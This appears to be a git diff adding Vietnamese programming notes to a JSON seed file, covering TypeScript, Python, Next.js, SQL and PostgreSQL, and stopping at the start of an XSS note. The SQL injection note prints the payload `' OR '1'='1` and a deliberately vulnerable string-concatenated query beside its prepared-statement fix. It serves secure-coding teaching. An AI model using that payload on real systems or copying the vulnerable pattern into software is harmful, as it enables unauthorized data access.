@@ -21,7 +21,7 @@
     "title": "Type và Interface khác nhau ở đâu",
     "slug": "type-va-interface-khac-nhau-o-dau",
     "summary": "Khi nào nên dùng type alias, khi nào nên dùng interface, và vì sao đừng tranh cãi quá nhiều.",
-    "content": "Cả hai đều mô tả hình dạng của dữ liệu. Khác biệt thật sự chỉ nằm ở vài điểm.\n\n## Interface gộp được, type thì không\n\n```ts\ninterface User { id: string }\ninterface User { email: string }\n// User giờ có cả id lẫn email (declaration merging)\n\ntype Product = { id: string }\n// type Product = { price: number }  // Lỗi: định nghĩa trùng tên\n```\n\nTính chất này hữu ích khi mở rộng type của thư viện ngoài, nhưng trong code của mình thì thường là bất ngờ không mong muốn.\n\n## Type làm được những thứ interface không làm được\n\n```ts\ntype Id = string | number                    // union\ntype Keys = keyof User                       // toán tử trên type\ntype Nullable<T> = T | null                  // generic alias\ntype Point = [number, number]                // tuple\n```\n\n## Quy ước dùng trong dự án này\n\n- Mô tả object công khai, có khả năng được mở rộng: `interface`.\n- Mọi thứ còn lại (union, tuple, type suy ra từ zod): `type`.\n\n```ts\ntype Note = z.infer<typeof NoteSchema> // suy ra từ schema, không viết tay\n```\n\n## Ghi nhớ\n\nChọn một quy ước rồi giữ nhất quán quan trọng hơn việc chọn cái nào.",
+    "content": "Trong một buổi review code, hai người dùng `type` và `interface` để định nghĩa cùng một hình dạng dữ liệu, và không ai chỉ ra được cái nào sai — cả hai đều compile, đều báo lỗi kiểu giống nhau khi truyền thiếu field. Cuộc tranh cãi chỉ có ý nghĩa thật sự khi gặp tình huống cụ thể: mở rộng type của một thư viện ngoài, lúc đó cách khai báo bạn chọn quyết định việc có thêm được field mới vào hay không.\n\n## Interface gộp được, type thì không\n\n```ts\ninterface User { id: string }\ninterface User { email: string }\n// User giờ có cả id lẫn email (declaration merging)\n\ntype Product = { id: string }\n// type Product = { price: number }  // Lỗi: định nghĩa trùng tên\n```\n\nTính chất này hữu ích khi mở rộng type của thư viện ngoài, nhưng trong code của mình thì thường là bất ngờ không mong muốn.\n\n## Type làm được những thứ interface không làm được\n\n```ts\ntype Id = string | number                    // union\ntype Keys = keyof User                       // toán tử trên type\ntype Nullable<T> = T | null                  // generic alias\ntype Point = [number, number]                // tuple\n```\n\n## Quy ước dùng trong dự án này\n\n- Mô tả object công khai, có khả năng được mở rộng: `interface`.\n- Mọi thứ còn lại (union, tuple, type suy ra từ zod): `type`.\n\n```ts\ntype Note = z.infer<typeof NoteSchema> // suy ra từ schema, không viết tay\n```\n\n## Ghi nhớ\n\nChọn một quy ước rồi giữ nhất quán quan trọng hơn việc chọn cái nào.",
     "tags": [
       "typescript",
       "type-system"
@@ -43,6 +43,354 @@
       "server-component"
     ],
     "starred": true,
+    "createdAt": "2026-08-17T00:00:00.000Z",
+    "updatedAt": "2026-08-17T00:00:00.000Z"
+  },
+  {
+    "id": "note-generic-trong-typescript",
+    "topicId": "topic-typescript",
+    "title": "Generic trong TypeScript",
+    "slug": "generic-trong-typescript",
+    "summary": "Cách viết hàm và type dùng lại được cho nhiều kiểu dữ liệu mà không mất kiểm tra kiểu.",
+    "content": "Bạn viết một hàm `first` để lấy phần tử đầu tiên của mảng số, dùng rất tốt. Vài hôm sau cần hàm y hệt cho mảng chuỗi, rồi cho mảng object người dùng. Copy dán ba lần thì trùng lặp code; đổi kiểu tham số thành `any` thì hàm dùng được cho mọi thứ, nhưng TypeScript không còn biết phần tử trả về là gì — autocomplete biến mất và lỗi gõ nhầm field chỉ lộ ra lúc chạy.\n\n## Hàm generic: một hàm, giữ nguyên kiểu\n\n```ts\nfunction first<T>(items: T[]): T | undefined {\n  return items[0]\n}\n\nconst a = first([1, 2, 3])       // kiểu: number | undefined\nconst b = first(['x', 'y', 'z']) // kiểu: string | undefined\n```\n\n`T` là tham số kiểu, TypeScript tự suy ra từ mảng truyền vào. Không cần khai báo kiểu tường minh, và kết quả vẫn được kiểm tra đầy đủ.\n\n## Ràng buộc generic bằng extends\n\nĐôi khi hàm cần `T` có sẵn một số thuộc tính, không chấp nhận kiểu bất kỳ:\n\n```ts\nfunction getLength<T extends { length: number }>(value: T): number {\n  return value.length\n}\n\ngetLength('hello')   // 5, string có length\ngetLength([1, 2, 3]) // 3, array có length\n// getLength(42)      // Lỗi: number không có length\n```\n\n`extends` ở đây không phải kế thừa class, mà là ràng buộc: `T` phải tương thích với hình dạng phía sau.\n\n## Generic trong interface\n\nMột kiểu bao bọc dữ liệu, như phản hồi API, cũng nên là generic thay vì viết riêng cho từng loại dữ liệu:\n\n```ts\ninterface ApiResponse<T> {\n  data: T\n  error: string | null\n}\n\ntype User = { id: string; name: string }\n\nfunction ok(data: User): ApiResponse<User> {\n  return { data, error: null }\n}\n```\n\n`ApiResponse<User>` và `ApiResponse<Note>` dùng chung một định nghĩa, chỉ khác tham số kiểu truyền vào.\n\n## Ghi nhớ\n\n- Generic giữ mối liên hệ giữa kiểu đầu vào và đầu ra mà `any` phá vỡ.\n- `extends` trên tham số kiểu là ràng buộc hình dạng, không phải kế thừa class.\n- Dùng generic cho code lặp lại cấu trúc nhưng khác kiểu dữ liệu, không phải cho mọi hàm.",
+    "tags": [
+      "typescript",
+      "generic"
+    ],
+    "starred": false,
+    "createdAt": "2026-08-17T00:00:00.000Z",
+    "updatedAt": "2026-08-17T00:00:00.000Z"
+  },
+  {
+    "id": "note-list-va-dict-comprehension",
+    "topicId": "topic-python",
+    "title": "List và dict comprehension",
+    "slug": "list-va-dict-comprehension",
+    "summary": "Cú pháp tạo list/dict trong một dòng, và khi nào thì vòng lặp thường dễ đọc hơn.",
+    "content": "Bạn viết bốn dòng vòng `for` chỉ để lọc số chẵn rồi bình phương chúng, trong khi code của đồng nghiệp gói gọn việc đó trong một dòng mà bạn phải đọc đi đọc lại mới hiểu nó làm gì. Comprehension không phải cú pháp bí hiểm — nó chỉ là vòng lặp viết theo thứ tự khác.\n\n## List comprehension\n\n```python\nnumbers = range(10)\nsquares = [n * n for n in numbers if n % 2 == 0]\nprint(squares)  # [0, 4, 16, 36, 64]\n```\n\nĐọc từ trái sang phải: lấy `n * n`, cho từng `n` trong `numbers`, nếu `n` chẵn.\n\n## Dict comprehension: cùng cú pháp, thêm key\n\n```python\nwords = [\"a\", \"bb\", \"ccc\"]\nby_length = {word: len(word) for word in words}\nprint(by_length)  # {'a': 1, 'bb': 2, 'ccc': 3}\n```\n\nKhác list comprehension đúng một chỗ: thêm `key:` trước biểu thức giá trị.\n\n## Khi vòng lặp thường vẫn rõ hơn\n\nKhi có nhiều bước xử lý, cần log, hoặc cần dừng sớm, nhồi hết vào một dòng comprehension làm code khó đọc hơn là nhanh hơn:\n\n```python\nresult = []\nfor user in users:\n    if not user.is_active:\n        continue\n    logger.info(\"Xu ly user %s\", user.id)\n    result.append(transform(user))\n```\n\n## Ghi nhớ\n\n- Comprehension hợp cho biến đổi + lọc đơn giản, đọc một dòng là hiểu ngay ý định.\n- Nhiều điều kiện lồng nhau hoặc có side-effect (log, ghi file, gọi API) thì dùng vòng lặp thường.\n- Dict comprehension chỉ khác list comprehension ở cặp `key: value` đứng trước `for`.",
+    "tags": [
+      "python",
+      "cu-phap"
+    ],
+    "starred": false,
+    "createdAt": "2026-08-17T00:00:00.000Z",
+    "updatedAt": "2026-08-17T00:00:00.000Z"
+  },
+  {
+    "id": "note-virtualenv-va-pip",
+    "topicId": "topic-python",
+    "title": "virtualenv và pip",
+    "slug": "virtualenv-va-pip",
+    "summary": "Vì sao mỗi dự án Python nên có môi trường riêng, và các lệnh cần nhớ.",
+    "content": "Hai dự án Python trên cùng một máy: một cần `requests==2.25`, một cần `requests==2.31`. Cài package thẳng vào Python hệ thống, `pip install` cho dự án sau sẽ ghi đè bản của dự án trước — và dự án trước lỗi ngay lần chạy tiếp theo, không báo trước.\n\n## Tạo và bật môi trường ảo\n\n```bash\npython3 -m venv .venv\nsource .venv/bin/activate   # Windows: .venv\\Scripts\\activate\n```\n\nSau khi bật, mọi `pip install` chỉ ảnh hưởng tới thư mục `.venv` của dự án hiện tại, không đụng tới Python hệ thống hay dự án khác.\n\n## Cài đặt và ghi lại phiên bản đang dùng\n\n```bash\npip install requests==2.31.0\npip freeze > requirements.txt\n```\n\n`requirements.txt` liệt kê chính xác phiên bản của mọi package, để máy khác cài lại y hệt:\n\n```bash\npip install -r requirements.txt\n```\n\n## Thoát môi trường\n\n```bash\ndeactivate\n```\n\nCâu lệnh này trả shell về trạng thái trước khi `activate`, không phải xoá `.venv`.\n\n## Ghi nhớ\n\n- Mỗi dự án một `.venv`, đừng cài package trực tiếp vào Python hệ thống.\n- `pip freeze > requirements.txt` sau khi cài; `pip install -r requirements.txt` khi thiết lập máy mới.\n- Thư mục `.venv` không commit vào git, chỉ commit `requirements.txt`.",
+    "tags": [
+      "python",
+      "moi-truong"
+    ],
+    "starred": false,
+    "createdAt": "2026-08-17T00:00:00.000Z",
+    "updatedAt": "2026-08-17T00:00:00.000Z"
+  },
+  {
+    "id": "note-type-hint-trong-python",
+    "topicId": "topic-python",
+    "title": "Type hint trong Python",
+    "slug": "type-hint-trong-python",
+    "summary": "Chú thích kiểu giúp IDE và mypy bắt lỗi sớm, dù Python không kiểm tra lúc chạy.",
+    "content": "Hàm `tong(a, b)` cộng hai số chạy tốt suốt nhiều tháng, tới khi một chỗ gọi truyền nhầm chuỗi `\"3\"` thay vì số `3`. Python không báo lỗi lúc đó — chương trình vẫn chạy, chỉ là kết quả trở thành `\"33\"` thay vì `6`, và bug chỉ lộ ra khi khách hàng report.\n\n## Chú thích kiểu cho tham số và giá trị trả về\n\n```python\ndef tong(a: int, b: int) -> int:\n    return a + b\n\ntong(\"1\", \"2\")  # mypy bao loi ngay, nhung Python van chay va noi chuoi thanh \"12\"\n```\n\nType hint không đổi hành vi lúc chạy — Python bỏ qua nó khi thực thi. Giá trị nằm ở việc IDE gạch đỏ dòng gọi sai kiểu, và công cụ kiểm tra tĩnh bắt lỗi trước khi deploy:\n\n```bash\nmypy app.py\n```\n\n## Optional cho giá trị có thể vắng mặt\n\n```python\nfrom typing import Optional\n\ndef tim_user(user_id: str) -> Optional[dict]:\n    if user_id not in database:\n        return None\n    return database[user_id]\n```\n\n`Optional[dict]` báo cho người gọi biết kết quả có thể là `None`, buộc phải kiểm tra trước khi dùng thay vì gặp lỗi `NoneType` lúc chạy.\n\n## Ghi nhớ\n\n- Type hint chỉ có tác dụng với IDE và công cụ như mypy; Python không kiểm tra lúc chạy.\n- Luôn khai báo kiểu trả về, nhất là khi hàm có thể trả `None`.\n- Chạy `mypy` trong CI để lỗi kiểu bị chặn trước khi merge, không phải sau khi lên production.",
+    "tags": [
+      "python",
+      "type-hint"
+    ],
+    "starred": false,
+    "createdAt": "2026-08-17T00:00:00.000Z",
+    "updatedAt": "2026-08-17T00:00:00.000Z"
+  },
+  {
+    "id": "note-server-actions",
+    "topicId": "topic-nextjs",
+    "title": "Server Actions",
+    "slug": "server-actions",
+    "summary": "Gọi hàm chạy trên server thẳng từ form, không cần tự viết API route.",
+    "content": "Muốn lưu một ghi chú mới từ form, cách cũ là viết `app/api/notes/route.ts` nhận POST, tự parse JSON, gọi repo — chỉ để phục vụ đúng một form. Phía client còn phải tự `fetch`, tự quản lý trạng thái loading và lỗi mạng cho một thao tác đơn giản là submit.\n\n## Định nghĩa Server Action\n\n```ts\n// app/notes/actions.ts\n'use server'\n\nimport * as notesRepo from '@/lib/db/notes.repo'\n\nexport async function createNote(formData: FormData) {\n  const title = formData.get('title')\n  if (typeof title !== 'string' || title.trim() === '') {\n    throw new Error('Tieu de khong duoc de trong')\n  }\n  await notesRepo.create({ topicId: 'topic-typescript', title, summary: '', content: '' })\n}\n```\n\n`'use server'` đánh dấu mọi export trong file này là hàm chạy trên server, dù được gọi từ component nào.\n\n## Gắn thẳng vào form, không cần fetch\n\n```tsx\n// app/notes/new/page.tsx\nimport { createNote } from '../actions'\n\nexport default function NewNotePage() {\n  return (\n    <form action={createNote}>\n      <input name=\"title\" placeholder=\"Tieu de\" />\n      <button type=\"submit\">Lưu</button>\n    </form>\n  )\n}\n```\n\nNext.js tự đóng gói lời gọi thành một request tới server; form vẫn hoạt động ngay cả khi JavaScript phía client chưa tải xong.\n\n## Ghi nhớ\n\n- Server Action là hàm `async` có `'use server'`, luôn chạy trên server dù gọi từ component client.\n- Gắn trực tiếp vào thuộc tính `action` của `<form>`, thay cho việc tự viết API route và `fetch`.\n- Vẫn phải validate dữ liệu trong action — request có thể không đến từ chính form đó.",
+    "tags": [
+      "nextjs",
+      "server-actions"
+    ],
+    "starred": true,
+    "createdAt": "2026-08-17T00:00:00.000Z",
+    "updatedAt": "2026-08-17T00:00:00.000Z"
+  },
+  {
+    "id": "note-caching-va-revalidate",
+    "topicId": "topic-nextjs",
+    "title": "Caching và revalidate",
+    "slug": "caching-va-revalidate",
+    "summary": "Next.js cache mặc định ở đâu, và cách làm dữ liệu mới hiện ra sau khi ghi.",
+    "content": "Bạn vừa thêm một ghi chú mới, quay lại trang danh sách nhưng ghi chú đó không xuất hiện — phải hard refresh vài lần mới thấy. Next.js đã cache kết quả `fetch` từ trước, và không tự biết dữ liệu vừa thay đổi.\n\n## fetch được cache mặc định\n\n```ts\nexport async function getNotes() {\n  const res = await fetch('https://api.example.com/notes', {\n    next: { revalidate: 60 }, // dùng lại cache tối đa 60 giây rồi mới gọi lại\n  })\n  return res.json()\n}\n```\n\nKhông truyền `next.revalidate`, App Router coi request đó là tĩnh và cache gần như vô thời hạn cho tới lần build sau.\n\n## Xoá cache ngay sau khi ghi\n\n```ts\n'use server'\nimport { revalidatePath } from 'next/cache'\nimport * as notesRepo from '@/lib/db/notes.repo'\n\nexport async function createNote(formData: FormData) {\n  await notesRepo.create({\n    topicId: 'topic-nextjs',\n    title: String(formData.get('title')),\n    summary: '',\n    content: '',\n  })\n  revalidatePath('/notes') // trang /notes render lại với dữ liệu mới ở request kế tiếp\n}\n```\n\n## Ghi nhớ\n\n- `fetch` trong Server Component được cache mặc định; đặt `next: { revalidate }` để giới hạn thời gian sống.\n- Sau khi ghi dữ liệu, gọi `revalidatePath` (hoặc `revalidateTag`) để xoá cache của trang liên quan.\n- Không thấy dữ liệu mới thường không phải bug ở database, mà là cache chưa được revalidate.",
+    "tags": [
+      "nextjs",
+      "caching"
+    ],
+    "starred": false,
+    "createdAt": "2026-08-17T00:00:00.000Z",
+    "updatedAt": "2026-08-17T00:00:00.000Z"
+  },
+  {
+    "id": "note-join-cac-loai",
+    "topicId": "topic-sql",
+    "title": "JOIN các loại",
+    "slug": "join-cac-loai",
+    "summary": "INNER, LEFT, RIGHT, FULL khác nhau thế nào qua một ví dụ hai bảng.",
+    "content": "Viết báo cáo \"liệt kê mọi khách hàng cùng đơn hàng của họ\" trên hai bảng `users(id, name)` và `orders(id, user_id, total)`, nhưng kết quả lại thiếu mất những khách chưa từng mua gì — vì kiểu JOIN mặc định chỉ giữ lại hàng khớp ở cả hai bảng.\n\n## INNER JOIN: chỉ giữ hàng khớp cả hai bên\n\n```sql\nSELECT u.name, o.total\nFROM users u\nINNER JOIN orders o ON o.user_id = u.id;\n-- Khách chưa có đơn hàng nào sẽ không xuất hiện trong kết quả\n```\n\n## LEFT JOIN: giữ toàn bộ bảng bên trái\n\n```sql\nSELECT u.name, o.total\nFROM users u\nLEFT JOIN orders o ON o.user_id = u.id;\n-- Mọi user đều có mặt; total là NULL với user chưa từng mua\n```\n\n## RIGHT JOIN và FULL JOIN\n\n```sql\n-- RIGHT JOIN: đối xứng với LEFT, giữ toàn bộ bảng bên phải (orders)\nSELECT u.name, o.total\nFROM users u\nRIGHT JOIN orders o ON o.user_id = u.id;\n\n-- FULL JOIN: hợp của LEFT và RIGHT, giữ mọi hàng của cả hai bảng\nSELECT u.name, o.total\nFROM users u\nFULL JOIN orders o ON o.user_id = u.id;\n```\n\n## Ghi nhớ\n\n- INNER JOIN: chỉ hàng có khớp ở cả hai bảng, dễ làm mất dữ liệu nếu dùng nhầm chỗ cần LEFT.\n- LEFT/RIGHT JOIN: giữ toàn bộ bảng chỉ định, cột của bảng còn lại là NULL nếu không khớp.\n- FULL JOIN: hợp của LEFT và RIGHT, hữu ích khi cần rà soát dữ liệu mồ côi ở cả hai chiều.",
+    "tags": [
+      "sql",
+      "join"
+    ],
+    "starred": true,
+    "createdAt": "2026-08-17T00:00:00.000Z",
+    "updatedAt": "2026-08-17T00:00:00.000Z"
+  },
+  {
+    "id": "note-group-by-va-having",
+    "topicId": "topic-sql",
+    "title": "GROUP BY và HAVING",
+    "slug": "group-by-va-having",
+    "summary": "Gom nhóm để tổng hợp, và vì sao điều kiện trên hàm tổng hợp phải nằm ở HAVING.",
+    "content": "Muốn lọc \"khách hàng đã đặt hơn 3 đơn\", viết `WHERE COUNT(*) > 3` thì database báo lỗi ngay — `WHERE` chạy trước khi các hàng được gom nhóm, nên lúc đó chưa có `COUNT(*)` nào để so sánh.\n\n## GROUP BY: gom hàng cùng giá trị thành một nhóm\n\n```sql\nSELECT user_id, COUNT(*) AS so_don, SUM(total) AS tong_tien\nFROM orders\nGROUP BY user_id;\n```\n\nMỗi hàng kết quả giờ đại diện cho một `user_id`, không còn là một đơn hàng riêng lẻ.\n\n## HAVING: điều kiện lọc sau khi đã gom nhóm\n\n```sql\nSELECT user_id, COUNT(*) AS so_don, SUM(total) AS tong_tien\nFROM orders\nGROUP BY user_id\nHAVING COUNT(*) > 3\nORDER BY tong_tien DESC;\n```\n\n`WHERE` lọc từng hàng gốc trước khi gom nhóm; `HAVING` lọc trên kết quả đã tổng hợp. Có thể dùng cả hai trong cùng một câu:\n\n```sql\nSELECT user_id, COUNT(*) AS so_don\nFROM orders\nWHERE total > 0      -- loc truoc: bo don gia tri am/hoan tien\nGROUP BY user_id\nHAVING COUNT(*) > 3;  -- loc sau: chi giu khach mua nhieu\n```\n\n## Ghi nhớ\n\n- Thứ tự thực thi thật sự: FROM -> WHERE -> GROUP BY -> HAVING -> SELECT -> ORDER BY.\n- Điều kiện trên hàm tổng hợp (COUNT, SUM, AVG...) luôn nằm ở HAVING, không nằm ở WHERE.\n- Lọc được ở WHERE thì đặt ở WHERE thay vì HAVING — giảm khối lượng dữ liệu trước khi gom nhóm sẽ nhanh hơn.",
+    "tags": [
+      "sql",
+      "aggregate"
+    ],
+    "starred": false,
+    "createdAt": "2026-08-17T00:00:00.000Z",
+    "updatedAt": "2026-08-17T00:00:00.000Z"
+  },
+  {
+    "id": "note-transaction-va-acid",
+    "topicId": "topic-sql",
+    "title": "Transaction và ACID",
+    "slug": "transaction-va-acid",
+    "summary": "Vì sao cần gói nhiều câu lệnh vào một giao dịch, và bốn tính chất của nó.",
+    "content": "Chuyển khoản giữa hai tài khoản cần hai câu UPDATE — trừ tiền tài khoản A, cộng tiền tài khoản B. Nếu server crash đúng lúc giữa hai câu lệnh, tiền biến mất khỏi A mà chưa kịp vào B.\n\n## Gói nhiều câu lệnh vào một transaction\n\n```sql\nBEGIN;\n\nUPDATE accounts SET balance = balance - 100 WHERE id = 1;\nUPDATE accounts SET balance = balance + 100 WHERE id = 2;\n\nCOMMIT;\n```\n\nNếu có lỗi giữa chừng (mất kết nối, ràng buộc bị vi phạm), gọi `ROLLBACK` thay vì `COMMIT` để hoàn tác toàn bộ:\n\n```sql\nBEGIN;\nUPDATE accounts SET balance = balance - 100 WHERE id = 1;\n-- phat hien loi nghiep vu o tang ung dung\nROLLBACK; -- balance cua id = 1 tro lai ban dau, cau UPDATE thu hai chua tung chay\n```\n\n## Bốn tính chất ACID\n\n- **Atomicity**: cả giao dịch thành công hết hoặc thất bại hết, không có nửa chừng.\n- **Consistency**: giao dịch đưa database từ trạng thái hợp lệ này sang trạng thái hợp lệ khác.\n- **Isolation**: các giao dịch chạy song song không thấy trạng thái trung gian của nhau.\n- **Durability**: sau khi COMMIT, dữ liệu tồn tại kể cả khi mất điện ngay sau đó.\n\n## Ghi nhớ\n\n- Từ hai câu lệnh phải cùng thành công hoặc cùng thất bại trở lên: bọc trong `BEGIN`...`COMMIT`.\n- Gặp lỗi giữa transaction thì `ROLLBACK`, đừng để nó tự treo giữa chừng.\n- ACID là lời hứa của database, không phải thứ ứng dụng phải tự cài đặt lại.",
+    "tags": [
+      "sql",
+      "transaction"
+    ],
+    "starred": false,
+    "createdAt": "2026-08-17T00:00:00.000Z",
+    "updatedAt": "2026-08-17T00:00:00.000Z"
+  },
+  {
+    "id": "note-index-va-khi-nao-nen-danh",
+    "topicId": "topic-postgresql",
+    "title": "Index và khi nào nên đánh",
+    "slug": "index-va-khi-nao-nen-danh",
+    "summary": "Index tăng tốc đọc nhưng làm chậm ghi — cách chọn cột đáng đánh index.",
+    "content": "Truy vấn tìm user theo email chạy nhanh lúc bảng còn vài nghìn dòng, nhưng chậm dần theo thời gian tới khi bảng có vài triệu dòng — dù không có gì trong code ứng dụng thay đổi. Database đang phải quét toàn bộ bảng cho mỗi lần tìm.\n\n## Index tăng tốc đọc thế nào\n\n```sql\nCREATE INDEX idx_users_email ON users (email);\n```\n\nKhông có index, tìm theo `email` là quét tuần tự cả bảng — chi phí tăng tuyến tính theo số dòng. Có index (mặc định là B-tree), Postgres tìm theo kiểu chia đôi, chi phí gần như không đổi dù bảng có 10 nghìn hay 10 triệu dòng.\n\n## Cái giá phải trả: ghi chậm hơn\n\nMỗi `INSERT`, `UPDATE`, `DELETE` trên bảng phải cập nhật lại toàn bộ index liên quan, không chỉ ghi dữ liệu. Bảng càng nhiều index, ghi càng chậm và càng tốn dung lượng đĩa.\n\n## Chọn cột đáng đánh index\n\n- Cột xuất hiện trong `WHERE`, `JOIN`, `ORDER BY` thường xuyên.\n- Cột có độ chọn lọc cao — nhiều giá trị phân biệt. Index trên cột `boolean` (chỉ 2 giá trị) gần như vô dụng.\n\n```sql\n-- Kiểm tra Postgres có thật sự dùng index không\nEXPLAIN SELECT * FROM users WHERE email = 'a@b.com';\n```\n\n## Ghi nhớ\n\n- Index tăng tốc `SELECT` nhưng làm chậm `INSERT`/`UPDATE`/`DELETE`.\n- Đánh index cho cột trong `WHERE`/`JOIN`/`ORDER BY` có độ chọn lọc cao.\n- Đừng đánh index \"phòng khi cần\" — mỗi index thừa là chi phí ghi thật, không phải lý thuyết.",
+    "tags": [
+      "postgresql",
+      "index",
+      "hieu-nang"
+    ],
+    "starred": true,
+    "createdAt": "2026-08-17T00:00:00.000Z",
+    "updatedAt": "2026-08-17T00:00:00.000Z"
+  },
+  {
+    "id": "note-doc-explain-analyze",
+    "topicId": "topic-postgresql",
+    "title": "Đọc EXPLAIN ANALYZE",
+    "slug": "doc-explain-analyze",
+    "summary": "Cách đọc kế hoạch thực thi để biết truy vấn chậm ở bước nào.",
+    "content": "Một API chậm hẳn so với tuần trước, nghi ngờ là do câu truy vấn nhưng nhìn vào SQL không thấy gì sai — cần biết chính xác bước nào trong kế hoạch thực thi đang ngốn thời gian, thay vì đoán mò.\n\n## Chạy EXPLAIN ANALYZE\n\n```sql\nEXPLAIN ANALYZE\nSELECT u.name, COUNT(o.id)\nFROM users u\nLEFT JOIN orders o ON o.user_id = u.id\nGROUP BY u.id;\n```\n\nKhác `EXPLAIN` thường (chỉ ước tính), `EXPLAIN ANALYZE` thực sự chạy câu lệnh và đo thời gian từng bước.\n\n## Đọc các con số quan trọng\n\n- `Seq Scan` (quét tuần tự) hay `Index Scan` (dùng index) trên mỗi bảng.\n- `actual time=x..y rows=n loops=m`: thời gian thực tế, số dòng, số lần lặp của bước đó.\n- `cost=start..total`: chi phí ước tính của planner, chỉ để so sánh tương đối giữa các phương án.\n\n## Dấu hiệu cần chú ý\n\n- `Seq Scan` trên bảng lớn kèm điều kiện lọc chọn lọc cao thường có nghĩa là thiếu index.\n- Số `rows` ước tính lệch xa số dòng thực tế nghĩa là thống kê của planner đã cũ:\n\n```sql\nANALYZE users;\n```\n\n## Ghi nhớ\n\n- `EXPLAIN` cho kế hoạch dự kiến; `EXPLAIN ANALYZE` chạy thật và đo thời gian từng bước.\n- `Seq Scan` không phải lúc nào cũng xấu — trên bảng nhỏ nó thường nhanh hơn `Index Scan`.\n- Ước tính `rows` lệch xa thực tế là dấu hiệu cần chạy lại `ANALYZE` trên bảng đó.",
+    "tags": [
+      "postgresql",
+      "explain",
+      "hieu-nang"
+    ],
+    "starred": false,
+    "createdAt": "2026-08-17T00:00:00.000Z",
+    "updatedAt": "2026-08-17T00:00:00.000Z"
+  },
+  {
+    "id": "note-kieu-du-lieu-nen-dung",
+    "topicId": "topic-postgresql",
+    "title": "Kiểu dữ liệu nên dùng",
+    "slug": "kieu-du-lieu-nen-dung",
+    "summary": "text, timestamptz, numeric, jsonb — chọn đúng kiểu ngay từ đầu đỡ phải migrate.",
+    "content": "Một bảng dùng `varchar(255)` cho mọi cột chữ, `float` cho giá tiền, `timestamp` không kèm múi giờ cho ngày tạo. Vài tháng sau hệ thống mở rộng ra nhiều múi giờ, và một khách hàng report số tiền lệch vài xu do sai số làm tròn — cả hai lỗi đều xuất phát từ việc chọn sai kiểu dữ liệu ngay từ đầu.\n\n## Chọn đúng kiểu ngay từ đầu\n\n```sql\nCREATE TABLE products (\n  id uuid PRIMARY KEY DEFAULT gen_random_uuid(),\n  name text NOT NULL,\n  price numeric(12, 2) NOT NULL,\n  created_at timestamptz NOT NULL DEFAULT now(),\n  metadata jsonb NOT NULL DEFAULT '{}'\n);\n```\n\n- `text` thay cho `varchar(n)`: Postgres không có lợi thế hiệu năng nào khi giới hạn độ dài, chỉ nên giới hạn khi nghiệp vụ thật sự yêu cầu.\n- `numeric` cho tiền tệ: chính xác tuyệt đối, không có sai số làm tròn như số thực dấu phẩy động.\n- `timestamptz` cho mọi mốc thời gian: Postgres luôn lưu quy về UTC, tự quy đổi ra múi giờ của client khi đọc.\n- `jsonb` cho dữ liệu nửa cấu trúc: vẫn truy vấn và đánh index được, không như lưu chuỗi JSON thô trong `text`.\n\n## Vì sao không dùng số thực cho tiền\n\n```sql\nSELECT 0.1::float8 + 0.2::float8; -- 0.30000000000000004, sai lệch do biểu diễn nhị phân\nSELECT 0.1::numeric + 0.2::numeric; -- 0.3, chính xác tuyệt đối\n```\n\n## Ghi nhớ\n\n- `text` thay cho `varchar(n)` trừ khi nghiệp vụ thật sự cần giới hạn độ dài ở tầng database.\n- `numeric` cho mọi giá trị tiền tệ, không bao giờ dùng `float`/`double`.\n- `timestamptz` cho thời gian, `jsonb` cho dữ liệu nửa cấu trúc cần truy vấn được.",
+    "tags": [
+      "postgresql",
+      "kieu-du-lieu"
+    ],
+    "starred": false,
+    "createdAt": "2026-08-17T00:00:00.000Z",
+    "updatedAt": "2026-08-17T00:00:00.000Z"
+  },
+  {
+    "id": "note-sql-injection",
+    "topicId": "topic-owasp",
+    "title": "SQL Injection",
+    "slug": "sql-injection",
+    "summary": "Vì sao nối chuỗi vào câu SQL là lỗ hổng, và prepared statement chặn nó thế nào.",
+    "content": "Trang tìm kiếm nhận input người dùng rồi nối thẳng vào câu SQL. Người dùng gõ `' OR '1'='1` vào ô tên thay vì một cái tên bình thường, và toàn bộ bảng `users` hiện ra thay vì chỉ đúng người họ gõ.\n\n## Vì sao nối chuỗi là lỗ hổng\n\n```ts\n// NGUY HIỂM: nối chuỗi input trực tiếp vào câu lệnh\nconst name = \"' OR '1'='1\"\nconst query = `SELECT * FROM users WHERE name = '${name}'`\n// Câu lệnh thực tế gửi tới database:\n// SELECT * FROM users WHERE name = '' OR '1'='1'  -> đúng với MỌI hàng\n```\n\nDatabase không phân biệt được đâu là cú pháp câu lệnh, đâu là dữ liệu người dùng gõ — vì cả hai đã bị trộn chung vào một chuỗi.\n\n## Prepared statement: tách dữ liệu khỏi câu lệnh\n\n```ts\nimport { Pool } from 'pg'\n\nconst pool = new Pool()\nconst name = \"' OR '1'='1\"\nconst result = await pool.query('SELECT * FROM users WHERE name = $1', [name])\n// $1 luôn được database hiểu là DỮ LIỆU, không thể biến thành cú pháp SQL\n```\n\nCâu lệnh (`'SELECT * FROM users WHERE name = $1'`) và dữ liệu (`[name]`) được gửi tách rời tới database; driver không bao giờ ghép chúng thành một chuỗi trước khi gửi.\n\n## Ghi nhớ\n\n- Không bao giờ nối chuỗi input người dùng trực tiếp vào câu SQL.\n- Prepared statement (`$1`, `$2`...) gửi câu lệnh và dữ liệu tách rời, dữ liệu không thể đổi cấu trúc câu lệnh.\n- ORM hiện đại dùng prepared statement bên dưới, nhưng raw query string tự nối tay vẫn nguy hiểm dù project có dùng ORM.",
+    "tags": [
+      "owasp",
+      "sql-injection"
+    ],
+    "starred": true,
+    "createdAt": "2026-08-17T00:00:00.000Z",
+    "updatedAt": "2026-08-17T00:00:00.000Z"
+  },
+  {
+    "id": "note-xss-cross-site-scripting",
+    "topicId": "topic-owasp",
+    "title": "XSS — Cross-Site Scripting",
+    "slug": "xss-cross-site-scripting",
+    "summary": "Ba dạng XSS và nguyên tắc escape theo ngữ cảnh xuất dữ liệu.",
